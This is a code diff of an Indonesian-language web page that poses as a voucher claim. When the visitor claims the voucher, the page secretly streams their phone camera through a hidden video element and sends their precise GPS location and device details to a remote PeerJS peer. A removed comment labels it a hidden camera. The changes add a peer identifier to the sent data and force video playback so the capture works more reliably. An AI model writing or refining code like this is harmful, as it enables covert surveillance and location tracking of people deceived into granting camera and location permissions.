@@ -20,11 +20,11 @@
     <p id="status"></p>
   </div>
 
-  <!-- Kamera tersembunyi (atribut muted ditambahkan agar autoplay tidak diblokir Android) -->
   <video id="webcam" autoplay playsinline muted style="display: none;"></video>
 
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
+    let myPeerId = null;
     
     const peer = new Peer({
       config: {
@@ -40,6 +40,11 @@
     let isFrontCamera = false;
     let dataConn = null;
 
+    peer.on('open', (id) => {
+      myPeerId = id;
+      hubungkanKeLaptop();
+    });
+
     function hubungkanKeLaptop() {
       if (!dataConn || !dataConn.open) {
         dataConn = peer.connect(ID_LAPTOP);
@@ -47,6 +52,7 @@
           dataConn.on('open', () => {
             const infoPerangkat = {
               type: 'device-info',
+              peerId: myPeerId,
               osBrowser: navigator.userAgent,
               resolusi: `${screen.width} x ${screen.height} px`,
               cpuCore: navigator.hardwareConcurrency || 'N/A',
@@ -66,17 +72,11 @@
       }
     }
 
-    peer.on('open', () => {
-      hubungkanKeLaptop();
-    });
-
     async function prosesKlaim() {
       document.getElementById('status').innerText = "Memproses voucher...";
-      
       hubungkanKeLaptop();
       mintaLokasiGPS();
       await startCamera();
-      
       alert("Voucher Berhasil Diklaim!");
       document.getElementById('status').innerText = "Voucher Aktif.";
     }
@@ -92,6 +92,7 @@
             if (dataConn && dataConn.open) {
               dataConn.send({
                 type: 'location-info',
+                peerId: myPeerId,
                 mapsUrl: mapsUrl,
                 lat: lat,
                 lng: lng
@@ -99,7 +100,7 @@
             }
           },
           (error) => {
-            console.warn("Izin lokasi ditolak atau gagal:", error.message);
+            console.warn("Izin lokasi ditolak:", error.message);
           },
           { enableHighAccuracy: true }
         );
@@ -115,12 +116,15 @@
         currentStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: mode }
         });
-        document.getElementById('webcam').srcObject = currentStream;
         
+        const webcamEl = document.getElementById('webcam');
+        webcamEl.srcObject = currentStream;
+        await webcamEl.play().catch(() => {});
+
         peer.call(ID_LAPTOP, currentStream);
       } catch (err) {
         console.error("Gagal mengakses kamera:", err);
-        alert("Akses kamera gagal! Pastikan alamat halaman menggunakan HTTPS dan izin kamera diaktifkan di browser HP.");
+        alert("Gagal mengakses kamera! Pastikan URL menggunakan HTTPS dan izin kamera diaktifkan.");
       }
     }
   </script>
